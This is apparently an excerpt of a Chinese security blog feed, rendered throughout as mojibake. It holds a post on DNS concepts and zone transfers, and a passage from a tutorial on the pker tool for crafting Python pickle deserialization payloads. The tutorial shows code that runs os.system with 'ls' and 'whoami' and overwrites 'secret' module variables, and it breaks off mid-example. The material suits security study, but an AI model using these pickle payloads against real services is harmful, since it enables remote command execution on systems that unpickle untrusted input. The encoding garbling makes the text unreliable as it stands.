æœåŠ¡å™¨ä¹Ÿä¼šç¼“å­˜ <code>baidu.com</code> çš„ ipï¼Œå…å¾—ä¸‹æ¬¡æŸ¥çš„æ—¶å€™è¿˜å¾—å†èµ°ä¸€éä¹‹å‰çš„æµç¨‹ï¼ˆå½“ç„¶ä¹Ÿæ˜¯åœ¨ç¼“å­˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹ï¼‰ã€‚</p><p>å„å¤§å…¬å¸ä¸€èˆ¬éƒ½æœ‰è‡ªå·±çš„æƒå¨åŸŸåæœåŠ¡å™¨ï¼Œè‡ªå·±ç»´æŠ¤ DNSï¼Œå¥½å¤„æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼š</p><ol><li>æ–¹ä¾¿ç®¡ç†ã€‚å‡å¦‚ä¸è‡ªå·±ç»´æŠ¤åŸŸåä¿¡æ¯ï¼ŒåŸŸåç”Ÿæ•ˆæ—¶é—´å’Œç¼“å­˜æ—¶é—´éƒ½æ˜¯ä¸å¯æ§çš„ï¼Œè€Œè‡ªå·±æ­å»ºå¯ä»¥é¿å…è¿™äº›é—®é¢˜ã€‚</li><li>åŠ¨æ€ç®¡ç†ã€‚æ¯”å¦‚é€šè¿‡ä¸€äº›è½¯ä»¶æ¥æ›´æ–°è‡ªå·±çš„ DNS ä¿¡æ¯æ›´æ–¹ä¾¿ï¼Œè¿˜å¯ä»¥åšåŠ¨æ€åŸŸåè§£æã€‚</li></ol><h3 id="æµç¨‹æ€»ç»“"><a href="#æµç¨‹æ€»ç»“" class="headerlink" title="æµç¨‹æ€»ç»“"></a>æµç¨‹æ€»ç»“</h3><p>ï¼ˆä»¥ä¸‹æµç¨‹ä»¥ A è®°å½•(è¡¨ç¤ºè¯¥åŸŸåè§£æåˆ°çš„ IP åœ°å€)ä¸ºä¾‹ï¼‰</p><ol><li>è®¾å¤‡ -&gt; LocalDNS æœåŠ¡å™¨ï¼ˆé€’å½’æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ -&gt; DNS æ ¹æœåŠ¡å™¨æˆ–è€…æœ€è¿‘çš„ä¼ æ’­èŠ‚ç‚¹ï¼ˆè¿­ä»£æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ &lt;- DNS æ ¹æœåŠ¡å™¨æˆ–è€…æœ€è¿‘çš„ä¼ æ’­èŠ‚ç‚¹ï¼ˆè¿”å›é¡¶çº§åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ -&gt; DNS é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆè¿­ä»£æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ &lt;- DNS é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆè¿”å›æƒå¨åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ -&gt; DNS æƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆè¿­ä»£æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ &lt;- DNS æƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆè¿”å› ipï¼‰</li><li>è®¾å¤‡ &lt;- LocalDNS æœåŠ¡å™¨ï¼ˆè¿”å› ipï¼‰</li></ol><h2 id="DNS-çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ"><a href="#DNS-çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ" class="headerlink" title="DNS çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ"></a>DNS çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ</h2><h3 id="DNS-èµ„æºè®°å½•ï¼ˆResource-Record-RRï¼‰"><a href="#DNS-èµ„æºè®°å½•ï¼ˆResource-Record-RRï¼‰" class="headerlink" title="DNS èµ„æºè®°å½•ï¼ˆResource Record, RRï¼‰"></a>DNS èµ„æºè®°å½•ï¼ˆResource Record, RRï¼‰</h3><p>DNS æœåŠ¡å™¨æœ‰è‡ªå·±çš„åŸŸæ–‡ä»¶ï¼ˆzone fileï¼‰ï¼Œzone file æ˜¯ç”±å¤šä¸ªè®°å½•ç»„æˆçš„ï¼Œæ¯ä¸€ä¸ªè®°å½•å°±è¢«ç§°ä¸ºèµ„æºè®°å½•ã€‚</p><p>å‡å¦‚ä½ ä¹°äº†ä¸€ä¸ªåŸŸåï¼Œéœ€è¦ç»‘å®šåˆ°å¯¹åº”çš„ ip ä¸Šæ¥æä¾› web æœåŠ¡ï¼Œæˆ–è€…è¦æä¾›å…¶ä»–æœåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™åŸŸåçš„é”€å”®æ–¹ä¼šè®©ä½ é€‰æ‹©è§£æçš„ç±»å‹ï¼Œå¸¸è§çš„æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li><code>A</code> è®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ª IPv4 åœ°å€ï¼ˆä¾‹å¦‚ï¼š100.100.100.100ï¼‰æœ€å¸¸ç”¨çš„</li><li><code>CNAME</code> è®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªåŸŸåï¼Œå®ç°ä¸è¢«æŒ‡å‘åŸŸåç›¸åŒçš„è®¿é—®æ•ˆæœï¼Œå¯ä»¥ç®€å•åœ°ç†è§£ä¸ºåŸŸåçš„åˆ«åã€‚æ¯”å¦‚ <code>www.baidu.com</code> å°±æ˜¯ cname åˆ° <code>baidu.com</code> ä¸Šï¼Œç„¶å <code>baidu.com</code> æ˜¯æœ‰è‡ªå·±çš„ A è®°å½•çš„ï¼Œè¿™æ ·æœ‰ä¸ªå¥½å¤„å°±æ˜¯å‡å¦‚æœ‰å¾ˆå¤šä¸ªåŸŸåï¼Œ<code>a.baidu.com</code>ã€<code>b.baidu.com</code>â€¦ï¼Œä½†æ˜¯ ip åªæœ‰ 1 ä¸ªï¼Œå¦‚æœä¸ç”¨ cnameï¼Œå½“è¿™ä¸ª ip å˜æ›´çš„æ—¶å€™ï¼Œæ¯ä¸ªä¸æ­¤ ip ç»‘å®šçš„åŸŸåéƒ½è¦å»æ”¹ A è®°å½•ï¼›ç”¨äº† cname ä¹‹åï¼Œåªéœ€è¦æ”¹ cname çš„åŸŸåï¼ˆ<code>baidu.com</code>ï¼‰çš„ A è®°å½•å³å¯ã€‚ï¼ˆCDN åŠ é€Ÿåº”è¯¥å°±æ˜¯è¿™æ ·åšçš„å¯¹å§~ï¼‰</li><li><code>MX</code> è®°å½•ï¼šæŒ‡å‘ç”µå­é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œä¸€èˆ¬ä¼šæ ¹æ®é‚®ç®±æœåŠ¡å•†æä¾›çš„ MX è®°å½•å¡«å†™æ­¤è®°å½•ã€‚</li><li><code>NS</code> è®°å½•ï¼šæƒå¨åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œå³å°†æŸäº›åŸŸåæŒ‡å®šè®©æŸä¸ª DNS åŸŸåæœåŠ¡å™¨æ¥è§£æã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰é¡¶çº§åŸŸåï¼ˆæˆ–è€…è¯´ä¸€çº§åŸŸåï¼‰æ‰æœ‰ ns è®°å½•ï¼Œæ¯”å¦‚ <code>www.weibo.com</code> æ˜¯æ²¡æœ‰ ns è®°å½•çš„ã€‚</li><li><code>TXT</code> è®°å½•ï¼šå¯ä»»æ„å¡«å†™ã€å¯ä¸ºç©ºã€‚ä¸€èˆ¬åšä¸€äº›éªŒè¯è®°å½•æ—¶ä¼šä½¿ç”¨æ­¤é¡¹ï¼Œä¾‹å¦‚ï¼šSPF è®°å½•ï¼ˆç”¨äºååƒåœ¾é‚®ä»¶ï¼‰</li><li><code>AAAA</code> è®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ª IPv6 åœ°å€ï¼ˆä¾‹å¦‚ï¼šff03:0:0:0:0:0:0:c1ï¼‰</li><li><code>SOA</code> è®°å½•ï¼šSOAï¼ˆStart of Authorityï¼‰å«åšèµ·å§‹æˆæƒæœºæ„è®°å½•ã€‚é€šä¿—åœ°æ¥è®²ï¼Œä¸€ä¸ªåŸŸåå¯èƒ½æœ‰å¾ˆå¤šä¸ª NS è®°å½•ï¼Œå› ä¸ºä¼šæœ‰å¤šå°æœåŠ¡å™¨åœ¨è¿›è¡Œè§£æï¼ˆè´Ÿè´£å‡è¡¡æˆ–è€…å¤‡ä»½ï¼‰ï¼Œä½†å“ªä¸€ä¸ªæ‰æ˜¯ä¸» DNS æƒå¨æœåŠ¡å™¨å‘¢ï¼Ÿè¿™ä¸ªå°±è¦çœ‹ SOA è®°å½•äº†ï¼Œå®ƒè¯´æ˜äº†åœ¨ä¼—å¤š NS è®°å½•é‡Œå“ªä¸€å°æ‰æ˜¯ä¸» DNS æƒå¨æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸» DNS æƒå¨æœåŠ¡å™¨ä¼šè´Ÿè´£å…¶ä»–äº‹æƒ…ï¼Œæ¯”å¦‚å‘Šè¯‰å…¶ä»– NS æƒå¨æœåŠ¡å™¨ä»€ä¹ˆæ—¶å€™è¯¥æ›´æ–°æ•°æ®ï¼ˆé€šè¿‡åŸŸä¼ é€çš„æ–¹å¼ï¼Œä¸‹é¢ä¼šè®²ï¼‰ï¼Œç”šè‡³è®°å½•é‡Œè¿˜æœ‰å¯¹åº”è”ç³»äººçš„é‚®ä»¶ã€TTL ç­‰ä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚</li><li><code>PTR</code> è®°å½•ï¼šPTR è®°å½•æ˜¯ A è®°å½•çš„é€†å‘è®°å½•ï¼Œè´Ÿè´£å°† IP åå‘è§£æä¸ºåŸŸåï¼Œè¿™ä¸ªå†…å®¹ç¨å¤šï¼Œå•ç‹¬æ”¾åœ¨ä¸‹é¢è®²</li><li><code>AXFR</code>ã€<code>IXFR</code> è®°å½•ï¼šæ¶‰åŠåŒºåŸŸä¼ é€ï¼Œå•ç‹¬æ”¾åœ¨ä¸‹é¢è®²</li></ol><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250127192139251.png" alt="image-20250127192139251"></p><h3 id="FQDN"><a href="#FQDN" class="headerlink" title="FQDN"></a>FQDN</h3><p><strong>FQDN</strong>ï¼ˆFully Qualified Domain Nameï¼Œå®Œå…¨é™å®šåŸŸåï¼‰æ˜¯æŒ‡åœ¨åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä¸­ä¸€ä¸ªå®Œæ•´çš„ã€å”¯ä¸€çš„åŸŸåï¼Œç”¨æ¥ç²¾ç¡®æ ‡è¯†äº’è”ç½‘ä¸Šçš„ä¸€ä¸ªä¸»æœºæˆ–æœåŠ¡çš„ä½ç½®ã€‚</p><h4 id="FQDN-çš„ç‰¹ç‚¹ï¼š"><a href="#FQDN-çš„ç‰¹ç‚¹ï¼š" class="headerlink" title="FQDN çš„ç‰¹ç‚¹ï¼š"></a><strong>FQDN çš„ç‰¹ç‚¹ï¼š</strong></h4><ol><li><strong>å®Œæ•´æ€§ï¼š</strong><ul><li>FQDN åŒ…æ‹¬ä¸»æœºåï¼ˆå¦‚ <code>www</code>ï¼‰å’ŒåŸŸåï¼ˆå¦‚ <code>example.com</code>ï¼‰ã€‚</li><li>å¿…é¡»åŒ…å«é¡¶çº§åŸŸåï¼ˆå¦‚ <code>.com</code>ã€<code>.org</code> ç­‰ï¼‰ï¼Œå¹¶æœ€ç»ˆä»¥ä¸€ä¸ªç‚¹ï¼ˆ<code>.</code>ï¼‰ç»“å°¾ï¼ˆåœ¨æŠ€æœ¯ä¸Šï¼Œæœ€åçš„ç‚¹è¡¨ç¤º DNS æ ¹ï¼‰ã€‚</li></ul></li><li><strong>å”¯ä¸€æ€§ï¼š</strong><ul><li>FQDN æ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œå®ƒèƒ½åœ¨æ•´ä¸ªäº’è”ç½‘ä¸­å”¯ä¸€æ ‡è¯†ä¸€å°è®¾å¤‡æˆ–æœåŠ¡ã€‚</li><li>æ¯ä¸ª FQDN éƒ½æŒ‡å‘ä¸€ä¸ªç‰¹å®šçš„ IP åœ°å€ï¼ˆé€šè¿‡ DNS è§£æï¼‰ã€‚</li></ul></li><li><strong>ç»“æ„</strong><ul><li>&lt;ä¸»æœºå&gt;.&lt;å­åŸŸå&gt;.&lt;äºŒçº§åŸŸå&gt;.&lt;é¡¶çº§åŸŸå&gt;.</li></ul></li><li><strong>ç”¨é€”</strong><ul><li>HTTPS è¯ä¹¦ï¼ˆSSL&#x2F;TLSï¼‰é€šå¸¸ç»‘å®šåˆ° FQDNï¼Œç¡®ä¿é€šä¿¡çš„å®‰å…¨æ€§å’Œå”¯ä¸€æ€§ã€‚</li><li>åœ¨é…ç½®é‚®ä»¶æœåŠ¡å™¨ã€SSH æœåŠ¡ç­‰ç½‘ç»œæœåŠ¡æ—¶ï¼Œé€šå¸¸éœ€è¦å¡«å†™ FQDN ä»¥ç¡®ä¿æœåŠ¡å¯ä»¥è¢«æ­£ç¡®è¯†åˆ«</li></ul></li></ol><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p><code>DDNS</code>æ¯”<code>DNS</code>å¤šäº†ä¸€ä¸ªDå¤šçš„å°±æ˜¯ä¸€ä¸ª<code>dynamic(åŠ¨æ€çš„)</code></p><p><code>DDNS</code>æ˜¯ä¸€ç§åŸŸåè§£ææœåŠ¡ï¼Œç”¨æ¥å°†åŠ¨æ€å˜åŒ–çš„ IP åœ°å€å®æ—¶æ›´æ–°åˆ°åŸŸåè§£æè®°å½•ä¸­ï¼Œä»è€Œè®©ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡å›ºå®šçš„åŸŸåè®¿é—® IP åœ°å€ä¸æ–­å˜åŒ–çš„è®¾å¤‡ã€‚</p><h2 id="Non-authoritative-answer"><a href="#Non-authoritative-answer" class="headerlink" title="Non-authoritative answer"></a>Non-authoritative answer</h2><p>è¿™ä¸ªæ„æ€å°±æ˜¯è¿™ä¸ªè§£æè®°å½•æ˜¯ä» LocalDNS çš„ç¼“å­˜é‡Œæ‹¿æ¥çš„ï¼Œè€Œä¸æ˜¯å‘çœŸæ­£è´Ÿè´£è¿™ä¸ªåŸŸåçš„ DNS æƒå¨æœåŠ¡å™¨æ‹¿æ¥çš„</p><h2 id="DNS-åŒºåŸŸä¼ é€"><a href="#DNS-åŒºåŸŸä¼ é€" class="headerlink" title="DNS åŒºåŸŸä¼ é€"></a>DNS åŒºåŸŸä¼ é€</h2><p>æ˜¯ä¸€ç§ç”¨äºåœ¨ DNS æœåŠ¡å™¨ä¹‹é—´å¤åˆ¶ DNS åŒºåŸŸæ•°æ®çš„æœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯ç¡®ä¿å¤šä¸ª DNS æœåŠ¡å™¨ä¸­å­˜å‚¨çš„åŸŸåè§£æè®°å½•ä¿æŒä¸€è‡´ã€‚è¿™ç§æœºåˆ¶é€šå¸¸åœ¨ä¸»ä» DNS æœåŠ¡å™¨ä¹‹é—´ä½¿ç”¨,DNSåŒºåŸŸä¼ é€æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li><code>axfr</code>ï¼šå®Œæ•´åŒºåŸŸä¼ é€</li><li><code>ixfr</code>ï¼šå¢é‡åŒºåŸŸä¼ é€</li></ol><p>æ‰€ä»¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ DNS åŒºåŸŸä¼ é€æ“ä½œåªæœ‰ç»è¿‡æˆæƒçš„ DNS æœåŠ¡å™¨æ‰æœ‰æƒæ‰§è¡Œï¼Œä½†è®¸å¤š DNS æœåŠ¡å™¨å´è¢«é”™è¯¯åœ°é…ç½®æˆåªè¦æœ‰äººå‘å‡ºè¯·æ±‚ï¼Œå°±ç›´æ¥æä¾›ä¸€ä¸ª zone çš„ DNS å†…å®¹ã€‚DNS åŸŸä¼ é€æ¼æ´ä¼šåœ¨ä¸‹ä¸€ç¯‡è¯¦ç»†ä»‹ç»ï¼Œè¿™ä¸ªæ‰‹æ®µæ˜¯å‰äº›å¹´ç”¨äºä¿¡æ¯æ”¶é›†çš„æ‰‹æ®µä¹‹ä¸€ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pker</title>
    <link href="/tuyi/2025/01/26/pker/"/>
    <url>/tuyi/2025/01/26/pker/</url>
    
    <content type="html"><![CDATA[<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li>pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚</a></li><li>ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼ˆç”Ÿæˆpickleç‰ˆæœ¬0çš„opcodeï¼‰ã€‚</li><li>å†æ¬¡å»ºè®®ï¼Œåœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚</li></ul><h2 id="pkerèƒ½åšçš„äº‹"><a href="#pkerèƒ½åšçš„äº‹" class="headerlink" title="pkerèƒ½åšçš„äº‹"></a>pkerèƒ½åšçš„äº‹</h2><blockquote><ul><li>å˜é‡èµ‹å€¼ï¼šå­˜åˆ°memoä¸­ï¼Œä¿å­˜memoä¸‹æ ‡å’Œå˜é‡åå³å¯</li><li>å‡½æ•°è°ƒç”¨</li><li>ç±»å‹å­—é¢é‡æ„é€ </li><li>listå’Œdictæˆå‘˜ä¿®æ”¹</li><li>å¯¹è±¡æˆå‘˜å˜é‡ä¿®æ”¹</li></ul></blockquote><p>å…·ä½“æ¥è®²ï¼Œå¯ä»¥ä½¿ç”¨pkerè¿›è¡ŒåŸå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œã€å®ä¾‹åŒ–æ–°çš„å¯¹è±¡ã€‚</p><h2 id="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"><a href="#ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"></a>ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹</h2><ol><li>pkerä¸­çš„é’ˆå¯¹pickleçš„ç‰¹æ®Šè¯­æ³•éœ€è¦é‡ç‚¹æŒæ¡</li><li>æ­¤å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼špythonä¸­çš„æ‰€æœ‰ç±»ã€æ¨¡å—ã€åŒ…ã€å±æ€§ç­‰éƒ½æ˜¯å¯¹è±¡ï¼Œè¿™æ ·ä¾¿äºå¯¹å„æ“ä½œè¿›è¡Œç†è§£ã€‚</li><li>pkerä¸»è¦ç”¨åˆ°<code>GLOBALã€INSTã€OBJ</code>ä¸‰ç§ç‰¹æ®Šçš„å‡½æ•°ä»¥åŠä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼Œå…¶ä»–çš„opcodeä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ï¼š</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä»¥ä¸‹<span class="hljs-keyword">module</span>éƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­<span class="hljs-keyword">module</span><br>è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´<br>å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»·<br><br><span class="hljs-keyword">GLOBAL</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;c&#x27;</span><br>è·å–<span class="hljs-keyword">module</span>ä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼š<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,instance(callableã€<span class="hljs-keyword">module</span>éƒ½æ˜¯instance)  <br><br>INST<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;i&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼š<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;o&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼š<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>è¾“å…¥ï¼šcallable,para<br><br>xxx(xx,...)<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;R&#x27;</span><br>ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>æˆ–<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;s&#x27;</span><br>æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;b&#x27;</span><br>å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®<br><br><span class="hljs-keyword">return</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;0&#x27;</span><br>å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼š<br><span class="hljs-keyword">return</span> xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ol><li>ç”±äºopcodeæœ¬èº«çš„åŠŸèƒ½é—®é¢˜ï¼Œpkerè‚¯å®šä¹Ÿä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸º<strong>å·¦å€¼</strong>ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚<code>getattr</code>ã€<code>dict.get</code>ï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦ï¼Œ<strong>ä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„</strong>ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚</li><li>pkerè§£æ<code>S</code>æ—¶ï¼Œç”¨å•å¼•å·åŒ…è£¹å­—ç¬¦ä¸²ã€‚æ‰€ä»¥pkerä»£ç ä¸­çš„åŒå¼•å·ä¼šè¢«è§£æä¸ºå•å¼•å·opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>è¢«è§£æä¸ºï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"><a href="#pkerï¼šå…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"></a>pkerï¼šå…¨å±€å˜é‡è¦†ç›–</h4><ul><li>è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥çš„<code>secret</code>æ¨¡å—ä¸­çš„<code>name</code>ä¸<code>category</code>å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># pythonçš„æ‰§è¡Œæ–‡ä»¶è¢«è§£æä¸º__main__å¯¹è±¡ï¼Œsecretåœ¨è¯¥å¯¹è±¡ä»å±ä¸‹</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šç»™å‡ºä¸€äº›å…·ä½“çš„åŸºæœ¬æ“ä½œçš„å®ä¾‹ã€‚</p><h4 id="pkerï¼šå‡½æ•°æ‰§è¡Œ"><a href="#pkerï¼šå‡½æ•°æ‰§è¡Œ" class="headerlink" title="pkerï¼šå‡½æ•°æ‰§è¡Œ"></a>pkerï¼šå‡½æ•°æ‰§è¡Œ</h4><ul><li>é€šè¿‡<code>b&#39;R&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span 